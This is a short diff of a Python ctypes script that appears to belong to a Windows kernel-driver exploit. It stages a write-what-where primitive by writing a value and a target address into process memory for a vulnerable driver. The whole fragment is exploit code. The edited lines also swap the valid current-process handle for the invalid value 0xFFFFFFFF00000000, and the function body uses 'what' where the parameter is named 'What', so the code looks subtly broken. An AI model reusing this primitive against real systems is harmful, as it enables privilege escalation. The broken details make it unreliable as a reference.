@@ -26,18 +26,18 @@ if dwStatus != STATUS_SUCCESS:
 	print("Something went wrong while allocating memory","e")
 	sys.exit()
 
-def writeQWORD(Driver=None, What=4141414141414141, Where=4242424242424242):
+def writeQWORD(Driver=None, What=0x4141414141414141, Where=0x4242424242424242):
 	what_addr = 0x000000001a001000 # Arbitrary offset inside baseadd
   	# Write the what value to what_addr
 	data = struct.pack("<Q", what)
-	dwStatus = kernel32.WriteProcessMemory(0xFFFFFFFFFFFFFFFF, what_addr, data, len(data), byref(written))
+	dwStatus = kernel32.WriteProcessMemory(0xFFFFFFFF00000000, what_addr, data, len(data), byref(written))
 	if dwStatus == 0:
 		print("Something went wrong while writing to memory","e")
 		sys.exit()
   
   # Pack the address of the what value and the where address
 	data = struct.pack("<Q", what_addr) + struct.pack("<Q", where)
-	dwStatus = kernel32.WriteProcessMemory(0xFFFFFFFFFFFFFFFF, 0x000000001a000000, data, len(data), byref(written))
+	dwStatus = kernel32.WriteProcessMemory(0xFFFFFFFF00000000, 0x000000001a000000, data, len(data), byref(written))
 	if dwStatus == 0:
 		print("Something went wrong while writing to memory in the packing section","e")
 		sys.exit()
